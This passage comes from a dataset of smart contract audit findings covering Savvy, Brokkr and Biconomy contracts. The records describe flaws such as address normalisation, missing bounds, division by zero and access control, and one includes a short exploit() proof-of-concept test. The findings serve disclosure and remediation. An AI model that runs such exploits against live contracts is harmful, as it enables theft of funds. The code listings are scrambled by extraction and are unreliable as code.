TokenUtils . safeTransfer ( yieldToken , recipient ,  amountYieldTokens ); 1176 1177 1178 } return amountYieldTokens ; 41 Proof Of Concept: Listing 15: contracts/SavvyPositionManager.sol 289 function exploit () { 290 291 292 vm . prank ( victim ); uint256 tokenAmount = yieldToken . balanceOf ( victim ); savvyPositionManager . depositBaseToken ( address ( yieldToken ) ,  tokenAmount , victim , tokenAmount ); 293 294 295 296 vm . prank ( owner ); allowlist . remove ( victim ); vm . expectRevert ( bytes ( \" Unauthorized \" )) ; savvyPositionManager . withdrawYieldToken ( address ( yieldToken ) ,  tokenAmount , victim ); 297 } Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to a multisignature wallet or any other method to make sure that the owners address doesnt get compromised. Remediation Plan: SOLVED: The Savvy team solved this issue. They removed the allowlist check on the withdraw, meaning that the users will be able to remove the funds. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 42 3.10 (HAL-10) ATTACK ON HARVEST BY A MALICIOUS KEEPER - MEDIUM ", "labels": ["Halborn", "Savvy_DeFi_Securtity", "Severity: Informational"]}, {"title": "LACK OF ADDRESS NORMALIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The multiple features of the delta_neutral contract do not consider that Terra addresses are valid both upper and all lower case. Although valid, a strict comparison between the same address in its all uppercase version (e.g.: TERRA1KG. . . XNL8) and its all lowercase version (e.g.: terra1kg. . . xnl8) failure. The likelihood of this issue was reduced as the affected functions were owner-only functionalities, therefore much less prone to error, or queries. Queries affected by this issue will only cause inconvenience rather than a security issue. Undesired situations could occur, such as loss of control over the owner or dependent contract addresses in case of instantiation with a misvalidated address made up of capital letters. Because update_config does not provide an option for changing the owner, as well as some addresses of the contracts, the administrator will lose access to contract management. Code Location: Listing 57,62,63,64,65,66,67,68,69,72,73,76) 1: delta_neutral/src/contract.rs (Lines maximum_cdps_per_user_per_asset : msg . minimum_investment_in_uusd : msg . minimum_investment_in_uusd 51 let config = Config { 52  , 53  maximum_cdps_per_user_per_asset , 54 55 56 57  ?, 58 owner : deps . api . addr_canonicalize (& msg . owner )? , is_test_contract : msg . is_test_contract , is_paused : msg . is_paused , fee_recipient : deps . api . addr_validate (& msg . fee_recipient ) fee_pct : Decimal :: from_ratio ( msg . fee_pct . numerator , msg . 12 ts_factory_contract_address : deps . api . addr_validate (& msg . maximum_total_investment_in_uusd : msg . maximum_user_investment_in_uusd : msg . is_reward_distribution_paused : msg . aust_token_address : deps . api . addr_validate (& msg . mir_token_address : deps . api . addr_validate (& msg . bro_token_address : deps . api . addr_validate (& msg .  fee_pct . denominator ) , 59  maximum_total_investment_in_uusd , 60  maximum_user_investment_in_uusd , 61  is_reward_distribution_paused , 62  aust_token_address )?, 63  mir_token_address )? , 64  bro_token_address )? , 65  ts_factory_contract_address )? , 66  a_market_contract_address )? , 67  mirr_mint_contract_address )? , 68  mirr_lock_contract_address )? , 69 70 71 72  mirr_masset_oracle )?, 73 74 75 76 77 78 79 }; a_market_contract_address : deps . api . addr_validate (& msg . mirr_mint_contract_address : deps . api . addr_validate (& msg . mirr_lock_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address )?, mirr_masset_oracle : deps . api . addr_validate (& msg . mirr_factory_contract_address : deps . api . addr_validate (& msg . mirr_factory_contract_address )?, astro_router_contract_address : deps . api . addr_validate (& msg . astro_router_contract_address )?, The above-mentioned lack of normalization was also noted in the following lines of the contracts: Listing 2: Affected resources 1 delta_neutral / src / contract . rs : #284 2 delta_neutral / src / queries . rs : #122 , 136 , 175 3 delta_neutral / src / conversions . rs : #291 , 292 4 delta_neutral / src / commands . rs : #294 , 448 , 563 13 Risk Level: Likelihood - 1 Impact - 4 Recommendation: One of the two approaches detailed below should be used:  Update the cosmwasm-vm and use cosmwasm_std::Api::addr_validate (reference CWA-2022-002).  If the update mentioned is not possible, addresses could be stored in canonical format by using the cosmwasm_std::Api::addr_canonicalize utility function. The following considerations should be considered when implementing the second option:  To successfully compare a canonical address, both ends should be in canonical format. For example, when performing access controls, the sender (e.g.: info.sender or env.message.sender) should be canoni- calized beforehand too.  To send funds to a canonicalized address or include them into a message to a different contract, they should be first turn into its human-readable format via the cosmwasm_std::Api::addr_humanize utility function Remediation plan: SOLVED: The issue was fixed in commit ccd453b35f50f7f1b6638389aa0284153b329e02. The Brokkr team solved the issue by validating all specified addresses with the is_lower_alpha() custom function, which is a kind of own imple- mentation for the to_lower() method. 14 ", "labels": ["Halborn", "Brokkr_Protocol_Delta_Neutral_CosmWasm", "Severity: Low"]}, {"title": "MISSING BOUNDS ON CONFIGURATION VARIABLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The delta_neutral contract has missing bounds on the maximum_cdps_per_user _per_asset, maximum_total_investment_in_uusd and maximum_user_investment _in_uusd variables. This can lead to unexpected contract behavior, such as preventing users from investing in a strategy. The bounds of these parameters should be enforced to avoid potential errors in the current or future uses of these variables. Code Location: Listing 3: delta_neutral/src/contract.rs (Lines 53,59,60) minimum_investment_in_uusd : msg . minimum_investment_in_uusd maximum_cdps_per_user_per_asset : msg . owner : deps . api . addr_canonicalize (& msg . owner )? , is_test_contract : msg . is_test_contract , is_paused : msg . is_paused , fee_recipient : deps . api . addr_validate (& msg . fee_recipient ) fee_pct : Decimal :: from_ratio ( msg . fee_pct . numerator , msg . let config = Config { 51 52  , 53  maximum_cdps_per_user_per_asset , 54 55 56 57  ?, 58  fee_pct . denominator ) , 59  maximum_total_investment_in_uusd , 60  maximum_user_investment_in_uusd , 61  is_reward_distribution_paused , 62  aust_token_address )?, 63  mir_token_address )? , 64 maximum_total_investment_in_uusd : msg . maximum_user_investment_in_uusd : msg . is_reward_distribution_paused : msg . aust_token_address : deps . api . addr_validate (& msg . mir_token_address : deps . api . addr_validate (& msg . bro_token_address : deps . api . addr_validate (& msg . 15 ts_factory_contract_address : deps . api . addr_validate (& msg . a_market_contract_address : deps . api . addr_validate (& msg .  bro_token_address )? , 65  ts_factory_contract_address )? , 66  a_market_contract_address )? , 67  mirr_mint_contract_address )? , 68  mirr_lock_contract_address )? , 69 70 71 72  mirr_masset_oracle )?, 73 74 75 76 77 78 79 }; mirr_mint_contract_address : deps . api . addr_validate (& msg . mirr_lock_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address )?, mirr_masset_oracle : deps . api . addr_validate (& msg . mirr_factory_contract_address : deps . api . addr_validate (& msg . mirr_factory_contract_address )?, astro_router_contract_address : deps . api . addr_validate (& msg . astro_router_contract_address )?, Moreover, these variables do not implement their bounds also when modi- fying them with the update_config function. Listing 4: delta_neutral/src/commands.rs 227 if let Some ( maximum_cdps_per_user_per_asset ) =  maximum_cdps_per_user_per_asset { 228 229 230 231 232 233 attributes . push ( Attribute :: new ( \" maximum_cdps_per_user_per_asset_changed \" , maximum_cdps_per_user_per_asset . to_string () , )); config . maximum_cdps_per_user_per_asset =  maximum_cdps_per_user_per_asset ; 234 235 236 } if let Some ( maximum_total_investment_in_uusd ) =  maximum_total_investment_in_uusd { 237 238 239 attributes . push ( Attribute :: new ( \" maximum_total_investment_in_uusd_changed \" , maximum_total_investment_in_uusd . to_string () , 16 240 241 )); config . maximum_total_investment_in_uusd =  maximum_total_investment_in_uusd ; 242 243 244 } if let Some ( maximum_user_investment_in_uusd ) =  maximum_user_investment_in_uusd { 245 246 247 248 249 attributes . push ( Attribute :: new ( \" maximum_user_investment_in_uusd_changed \" , maximum_user_investment_in_uusd . to_string () , )); config . maximum_user_investment_in_uusd =  maximum_user_investment_in_uusd ; 250 } Risk Level: Likelihood - 4 Impact - 1 Recommendation: and bounds maximum_cdps_per_user_per_asset, the Upper for lower maximum_user_investment_in_uusd maximum_total_investment_in_uusd and variables should be applied when they are updated during the execution of the update_config function and at instantiation. Remediation plan: RISK ACCEPTED: The Brokkr team claimed that to optimize the size of the code in the contract, the bounds mentioned above will not be introduced. 17 ", "labels": ["Halborn", "Brokkr_Protocol_Delta_Neutral_CosmWasm", "Severity: Low"]}, {"title": "MISSING DEDICATED ROLES TO MANAGE CONTRACT STATUS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The delta_neutral contract supports several types of pauses that may Nevertheless, all of occur in the logic of an investment strategy. them can only be invoked by the contract owner, which therefore becomes single-point-of-failure. This problem could be solved by creating a special role that has access only to specific contract functionalities, such as changing the value of is_paused or is_reward_distribution_paused. Code Location: Listing 206,211,236,237,239,280,281,282,283,284,285) 5: lockdrop/src/commands.rs (Lines 202 pub fn update_config ( deps : DepsMut , 203 minimum_investment_in_uusd : Option < Uint128 >, 204 maximum_cdps_per_user_per_asset : Option < u32 >, 205 is_paused : Option < bool >, 206 fee_recipient : Option < String >, 207 fee_pct : Option < DecimalRatio >, 208 maximum_total_investment_in_uusd : Option < Uint128 >, 209 maximum_user_investment_in_uusd : Option < Uint128 >, 210 is_reward_distribution_paused : Option < bool >, 211 212 bro_token_address : Option < String >, 213 ) -> Result < Response , ContractError > { 214 215 216 let mut config = load_config ( deps . storage ) ?; let mut attributes : Vec < Attribute > = vec! [ Attribute :: new (\"  action \" , \" update_config \") ]; 217 218 if let Some ( minimum_investment_in_uusd ) = 18  minimum_investment_in_uusd { 219 220 221 222 223 224 attributes . push ( Attribute :: new ( \" minimum_investment_in_uusd_changed \" , minimum_investment_in_uusd . to_string () , )); config . minimum_investment_in_uusd =  minimum_investment_in_uusd ; 225 226 227 } if let Some ( maximum_cdps_per_user_per_asset ) =  maximum_cdps_per_user_per_asset { 228 229 230 231 232 233 attributes . push ( Attribute :: new ( \" maximum_cdps_per_user_per_asset_changed \" , maximum_cdps_per_user_per_asset . to_string () , )); config . maximum_cdps_per_user_per_asset =  maximum_cdps_per_user_per_asset ; 234 235 236 237 } if let Some ( is_paused ) = is_paused { attributes . push ( Attribute :: new ( \" is_paused_changed \" ,  is_paused . to_string () )) ; 238 239 240 241 242 243 244 245 246 247 248 config . is_paused = is_paused ; } if let Some ( fee_recipient ) = fee_recipient { attributes . push ( Attribute :: new ( \" fee_recipient_changed \" , fee_recipient . to_string () , )); config . fee_recipient = deps . api . addr_validate (&  fee_recipient ) ?; 249 250 251 252 253 } if let Some ( fee_pct ) = fee_pct { if fee_pct . denominator == 0  denominator ) 254 255 { || WDecimal :: from_ratio ( fee_pct . numerator , fee_pct . > WDecimal :: from_ratio (100 u128 , 1 u128 ) 19 256 257 258 259 return Err ( ContractError :: InvalidFeeError {}) ; } attributes . push ( Attribute :: new ( \" fee_pct_changed \" , fee_pct .  to_string () )); 260 261 config . fee_pct = WDecimal :: from_ratio ( fee_pct . numerator ,  fee_pct . denominator ); 262 263 264 } if let Some ( maximum_total_investment_in_uusd ) =  maximum_total_investment_in_uusd { 265 266 267 268 269 attributes . push ( Attribute :: new ( \" maximum_total_investment_in_uusd_changed \" , maximum_total_investment_in_uusd . to_string () , )); config . maximum_total_investment_in_uusd =  maximum_total_investment_in_uusd ; 270 271 272 } if let Some ( maximum_user_investment_in_uusd ) =  maximum_user_investment_in_uusd { 273 274 275 276 277 attributes . push ( Attribute :: new ( \" maximum_user_investment_in_uusd_changed \" , maximum_user_investment_in_uusd . to_string () , )); config . maximum_user_investment_in_uusd =  maximum_user_investment_in_uusd ; 278 279 280 } if let Some ( is_reward_distribution_paused ) =  is_reward_distribution_paused { 281 282 283 284 285 attributes . push ( Attribute :: new ( \" is_reward_distribution_paused_changed \" , is_reward_distribution_paused . to_string () , )); config . is_reward_distribution_paused =  is_reward_distribution_paused ; 286 287 288 289 290 291 } if let Some ( bro_token_address ) = bro_token_address { attributes . push ( Attribute :: new ( \" bro_token_address_changed \" , bro_token_address . to_string () , 20 292 293 294 )); config . bro_token_address = deps . api . addr_validate (&  bro_token_address ) ?; 295 296 297 298 299 } } store_config ( deps . storage , & config ) ?; Ok ( Response :: new () . add_attributes ( attributes )) Risk Level: Likelihood - 1 Impact - 2 Recommendation: We suggest exploring the possibility of introducing an additional role responsible for contract management and potential pauses in its logic, for example Pauser. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 21 ", "labels": ["Halborn", "Brokkr_Protocol_Delta_Neutral_CosmWasm", "Severity: Informational"]}, {"title": "UNUSED CONFIG VARIABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The instantiate function implements the is_test_contract variable, which is not used anywhere in the contract. It is a good practice to eliminate the so-called dead code, which in no way affects the logic of the program being executed. Code Location: Listing 6: lockdrop/src/contract.rs (Line 55) minimum_investment_in_uusd : msg . minimum_investment_in_uusd maximum_cdps_per_user_per_asset : msg . owner : deps . api . addr_canonicalize (& msg . owner )? , is_test_contract : msg . is_test_contract , is_paused : msg . is_paused , fee_recipient : deps . api . addr_validate (& msg . fee_recipient ) fee_pct : Decimal :: from_ratio ( msg . fee_pct . numerator , msg . 51 let config = Config { 52  , 53  maximum_cdps_per_user_per_asset , 54 55 56 57  ?, 58  fee_pct . denominator ) , 59  maximum_total_investment_in_uusd , 60  maximum_user_investment_in_uusd , 61  is_reward_distribution_paused , 62  aust_token_address )?, 63  mir_token_address )? , 64  bro_token_address )? , 65 maximum_total_investment_in_uusd : msg . maximum_user_investment_in_uusd : msg . is_reward_distribution_paused : msg . aust_token_address : deps . api . addr_validate (& msg . mir_token_address : deps . api . addr_validate (& msg . bro_token_address : deps . api . addr_validate (& msg . ts_factory_contract_address : deps . api . addr_validate (& msg . 22  ts_factory_contract_address )? , 66  a_market_contract_address )? , 67  mirr_mint_contract_address )? , 68  mirr_lock_contract_address )? , 69 a_market_contract_address : deps . api . addr_validate (& msg . mirr_mint_contract_address : deps . api . addr_validate (& msg . mirr_lock_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address : deps Risk Level: Likelihood - 2 Impact - 1 Recommendation: Unused is_test_contract variable should be removed. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 23 ", "labels": ["Halborn", "Brokkr_Protocol_Delta_Neutral_CosmWasm", "Severity: Informational"]}, {"title": "NO CONVENTION IN VARIABLE TYPES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the analysis of the contract code, it was noticed that in many places the variables storing addresses are assigned the CanonicalAddr type; however, there are still single cases of using the standard Addr type. Considering the fact that the contract is largely adapted to support canonical addresses, it is a good practice to keep the convention, which will increase the readability of the code and make the impact of potential future changes to a smaller number of types. Code Location: Listing 7: Samples usage of standard Addr types: 1 packages / services / src / delta_neutral . rs : #261 , 262 , 299 , 302 2 contracts / delta_neutral / src / state . rs : #254 , 262 , 286 , 294 Risk Level: Likelihood - 1 Impact - 1 Recommendation: To keep the convention, we suggest that you consider adapting the contract to handle one type of variable holding addresses. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 24 ", "labels": ["Halborn", "Brokkr_Protocol_Delta_Neutral_CosmWasm", "Severity: Informational"]}, {"title": "UNMANTAINED DEPENDENCY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Halborn used automated security scanners to assist with detection of well-known security issues and vulnerabilities. Among the tools used was cargo audit, a security scanner for vulnerabilities reported to the RustSec Advisory Database. All vulnerabilities published in https:// crates.io are stored in a repository named The RustSec Advisory Database. cargo audit is a human-readable version of the advisory database which performs a scanning on Cargo.lock. Security Detections are only in scope. To better assist the developers maintaining this code, the auditors are including the output with the dependencies tree, and this is included in the cargo audit output to better know the dependencies affected by unmaintained and vulnerable crates. ID RUSTSEC-2020-0025 package bigint Short Description biginit is unmaintained, use uint instead Code Location: Listing 8: Dependency tree 1 bigint 4.4.3 2 3 4 cosmwasm - bignumber 2.2.0 moneymarket 0.3.0 brotocol - delta - neutral 1.0.0 Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: Beware of using dependencies and packages that are no longer supported by the developers or have publicly known security flaws, even when not exploitable at the moment. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 26 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Brokkr_Protocol_Delta_Neutral_CosmWasm", "Severity: Informational"]}, {"title": "INVALID CHECK ON CREATECLAIM METHOD LEADS TO UNCLAIM OF TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The createClaim method on the contract which ables to create claim for beneficiary users is vulnerable to division by zero vulnerability due to invalid check. This method takes several arguments such as _beneficiary, _vestAmount, _unlockAmount, _unlockTime, _startTime and _endTime. Also, this method has several require controls itself. The following require check makes it possible to enter 0 as the _endTime variable if _startTime variable equals to 0. Listing 1: BicoVestingFlat.sol 1 require ( _endTime >= _startTime , \" INVALID_TIME \" ); Setting 0 as both _startTime and _endTime variables will work properly. However, the claimableAmount method will not work since division by zero occur due to _endTime variable equals to 0. Therefore, it will not be possible to claim tokens for beneficiary. As a result, tokens will be stuck on the contract even claims[beneficiary].isActive equals to true. Code Location: Listing 2: BicoVestingFlat.sol (Lines 1156) 1147 function createClaim ( 1148 1149 1150 1151 1152 address _beneficiary , uint256 _vestAmount , uint256 _unlockAmount , uint256 _unlockTime , uint64 _startTime , 14 1153 1154 1155 1156 1157 1158 1159 1160 1161 1162 1163 1164 1165 1166 1167 1168 1169 1170 1171 1172 1173 1174 1175 1176 1177 1178 1179 1180 1181 1182 1183 1184 1185 1186 1187 1188 1189 1190 1191 1192 1193 uint64 _endTime ) public onlyAdmin { require (! claims [ _beneficiary ]. isActive , \" CLAIM_ACTIVE \" ); require ( _endTime >= _startTime , \" INVALID_TIME \" ); require ( _beneficiary != address (0) , \" INVALID_ADDRESS \"); require ( _vestAmount > 0, \" INVALID_AMOUNT \" ); // review // should probably use IERC20 interface instead of ERC20 import ? // need for safe transfer ? // notice // Admin needs to give prior apporve tokens to this contract require ( ERC20 ( tokenAddress ). allowance ( msg . sender , address ( this )) >= ( _vestAmount . add ( _unlockAmount )) , \" INVALID_ALLOWANCE \" ); ERC20 ( tokenAddress ). transferFrom ( msg . sender , address ( this ) , _vestAmount ); Claim memory newClaim = Claim ({ isActive : true , vestAmount : _vestAmount , unlockAmount : _unlockAmount , unlockTime : _unlockTime , startTime : _startTime , endTime : _endTime , amountClaimed : 0 }) ; claims [ _beneficiary ] = newClaim ; emit ClaimCreated ( msg . sender , _beneficiary , _vestAmount , _unlockAmount , _unlockTime , _startTime , _endTime ); 15 1194 } Listing 3: BicoVestingFlat.sol (Lines 1255,1256) 1254 { 1255 1256 1257 1258 1259 1260 1261 1262 } claimPercent = currentTimestamp . sub ( _claim . startTime ). mul (1 e18 ). div ( _claim . endTime . sub ( _claim . startTime ) ); claimAmount = _claim . vestAmount . mul ( claimPercent ). div (1 e18 ). add ( _claim . unlockAmount ); unclaimedAmount = claimAmount . sub ( _claim . amountClaimed ); Risk Level: Likelihood - 4 Impact - 4 Recommendations: It is recommended to replace the require check above with the following one. Also, it is possible to mitigate this issue by implementing zero check for _endTime variable. Listing 4: Possible Fix 1 require ( _endTime > _startTime , \" INVALID_TIME \" ); Listing 5: Possible Fix-2 1 require ( _endTime != 0 , \" INVALID_TIME_FOR_ENDTIME \" ); 16 Remediation Plan: SOLVED: The Biconomy Team solved this issue by implementing the recom- mendation above. It has become impossible to set 0 as _endTime variable with this mitigation. As a result, division by zero will not occur in the future. Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 17 ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: High"]}, {"title": "CLAIMING TOKENS BEFORE UNLOCKTIME LEADS UNCLAIM OF LOCKED TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The createClaim method on the contract which can to create claim for beneficiary users is vulnerable to unclaimed tokens. If any user tries to claim their rewards before reaching to _unlockTimes timestamp variable, the isActive field changes to false. The contract does not have any Therefore, method to convert the isActive field to true from false. users will not be able to get their unlocked amounts as rewards if they try to claim awards before their _unlockTime. For example, the contract admin creates a claim with following variables: Listing 6: Create Claim Example 1 _beneficiary = \"0 x ...... \" , 2 _vestAmount = \" 1 Test Token \" , 3 _unlockAmount = \" 200 Test Token \" , 4 _unlockTime = current_timestamp + 1 day , 5 _startTime = 0, 6 _endTime = current_timestamp + 1 minute If user tries to claim awards after current_timestamp + 1 day, that user will get only 201 Test Tokens. However, if the user tries to claim awards before _unlockTime, user will get only 1 Test Token, the isActive field will be set to false by contract and it will not be possible to change it to true even timestamp reaches to _unlockTime. As a result, 200 Test Tokens will be stuck on the contract. 18 Code Location: Listing 7: BicoVestingFlat.sol (Lines 1285) 1278 function claim () external whenNotPaused nonReentrant { address beneficiary = msg . sender ; 1279 Claim memory _claim = claims [ beneficiary ]; 1280 require ( _claim . isActive , \" CLAIM_INACTIVE \" ); 1281 uint256 unclaimedAmount = claimableAmount ( beneficiary ); 1282 ERC20 ( tokenAddress ). transfer ( beneficiary , unclaimedAmount ) 1283 ; _claim . amountClaimed = _claim . amountClaimed + unclaimedAmount ; if ( _claim . amountClaimed == _claim . vestAmount ) _claim . isActive = false ; claims [ beneficiary ] = _claim ; emit Claimed ( beneficiary , unclaimedAmount ); 1284 1285 1286 1287 1288 } Risk Level: Likelihood - 4 Impact - 4 Recommendations: It is recommended to implement another check to validate the following formula. Listing 8: Formula 1 _unlockTime < _startTime < _endTime 19 Remediation Plan: SOLVED: The Biconomy Team solved this issue by implementing the formula above. All time variables will be controlled sequentially. Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 20 ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: High"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "If youre using an unsigned integer in Solidity, the possible values of your variable ranges from 0 to 2 ^ 256. So, it means that if you are around the max value and increment your variable, it will go back to 0. The same happens if your variable is at 0, and you subtract one, instead of overflow it is called underflow. The SafeMath library also protects contracts for possible integer over- flows or underflows. Even this control mechanism exists on the contract, BicoVestingFlat.sol contract is vulnerable to the integer overflow vulnerability due to missing use of add() method. Code Location: Listing 9: BicoVestingFlat.sol (Lines 1284) 1284 _claim . amountClaimed = _claim . amountClaimed + unclaimedAmount ; Risk Level: Likelihood - 3 Impact - 3 21 Recommendations: It is recommended to use SafeMath add() method instead of plus (+) oper- ator. Listing 10: BicoVestingFlat.sol 1284 _claim . amountClaimed = _claim . amountClaimed . add ( unclaimedAmount ); Remediation Plan: SOLVED: plus (+)operator. This issue was removed by replacing the .add() function with Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 22 ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: Medium"]}, {"title": "MISSING ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization of permissions on a token. All the features of the smart contract, such as mint/burn tokens and pause contracts, are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process user, or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. There are multiple important functionalities on BicoVestingFlat.sol contract such as creating claims for beneficiaries, setting new Admin for the contract and pausing/unpausing the contract. It is important to divide these functionalities into multiple roles. Code Location: Listing 11: Centralized Functions 1 function pause () 2 function unpause () 3 function createClaim ( address _beneficiary , uint256 _vestAmount , uint256 _unlockAmount , uint256 _unlockTime , uint64 _startTime , uint64 _endTime ) 4 function createBatchClaim ( address [] memory _beneficiaries , uint256 [] memory _vestAmounts , uint256 [] memory _unlockAmounts , uint256 [] memory _unlockTimes , uint64 [] memory _startTimes , uint64 [] memory _endTimes ) 5 function setAdmin ( address admin , bool enabled ) 23 Risk Level: Likelihood - 3 Impact - 1 Recommendations: RESOURCE_SETTER, PAUSER roles and onlyResourceSetter, onlyPauser modi- fiers should be implemented for the following functions to avoid cen- tralization of the contract. Listing 12: Centralized Functions 1 function pause () onlyPauser 2 function unpause () onlyPauser 3 function createClaim ( address _beneficiary , uint256 _vestAmount , uint256 _unlockAmount , uint256 _unlockTime , uint64 _startTime , uint64 _endTime ) onlyResourceSetter 4 function createBatchClaim ( address [] memory _beneficiaries , uint256 [] memory _vestAmounts , uint256 [] memory _unlockAmounts , uint256 [] memory _unlockTimes , uint64 [] memory _startTimes , uint64 [] memory _endTimes ) onlyResourceSetter Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 24 ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: Low"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Owner of the contract is usually the account which deploys the con- As a result, the Owner can perform some privileged functions tract. In BicoVestingFlat.sol smart contract, the like transferOwnership(). renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Code Location: Listing 13: BicoVestingFlat.sol 1114 contract BicoVesting is AccessProtected , Pausable , ReentrancyGuard { 1115 . . . 1116 } Risk Level: Likelihood - 3 Impact - 1 Recommendations: It is recommended to prevent the current owner from calling the renounceOwnership method before transferring the Ownership to another address. In addition, if a multi-signature wallet is used, calling the renounceOwnership method should be confirmed for two or more users. 25 Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 26 ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: Low"]}, {"title": "LACK OF ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The BicoVestingFlat.sol contract have multiple input fields on their both public and private functions. Some of these inputs are required as address variable. During the test, it has seen some of these inputs are not protected against using the address(0) as the target address. It is not recommended to use zero address as target addresses on the contracts. Code Location: Listing 14: BicoVestingFlat.sol (Lines 1077) 1076 function setAdmin ( address admin , bool enabled ) external onlyOwner 1077 1078 1079 { } _admins [ admin ] = enabled ; emit AdminAccessSet ( admin , enabled ); Listing 15: BicoVestingFlat.sol (Lines 1144) 1143 constructor ( address _tokenAddress ) { 1144 1145 tokenAddress = _tokenAddress ; } Risk Level: Likelihood - 2 Impact - 2 27 Recommendations: It is recommended to implement additional address check to detect is current contract getting used as a target address. Listing 16: BicoVestingFlat.sol 1076 function setAdmin ( address admin , bool enabled ) external onlyOwner 1077 1078 1079 1080 { } require ( admin != address (0) , \" Address can not be zero . \" ); _admins [ admin ] = enabled ; emit AdminAccessSet ( admin , enabled ); Listing 17: BicoVestingFlat.sol 1143 constructor ( address _tokenAddress ) { 1144 require ( _tokenAddress != address (0) , \" Address can not be zero . \"); tokenAddress = _tokenAddress ; 1145 1146 } Remediation Plan: SOLVED: the contract code. This issue was removed by implementing zero address checks to Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 28 ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF OWNERSHIP FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some ownership functions on the contract come directly from the included libraries. These functions are listed in the Code Location section. These functions are thought to have been included mistakenly. Code Location: Listing 18: Misused Functions 1 function renounceOwnership () 2 function transferOwnership ( address newOwner ) Risk Level: Likelihood - 2 Impact - 2 Recommendations: It is recommended to override and disable these functions. Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 29 ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: Low"]}, {"title": "MISSING ISACTIVE CONTROL ON REVOKE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There is a revoke method that is used to invalidate claims created specifically for beneficiary addresses on the contract. A check over this method has been found to be missing. As a result, the function can be executed again even if the claim is invalidated. This may adversely affect the use of gas. Code Location: Listing 19: BicoVestingFlat.sol (Lines 1291) 1290 function revoke ( address beneficiary ) external onlyAdmin { claims [ beneficiary ]. isActive = false ; 1291 emit Revoked ( beneficiary ); 1292 1293 } Risk Level: Likelihood - 2 Impact - 2 30 Recommendations: It is suggested to implement following 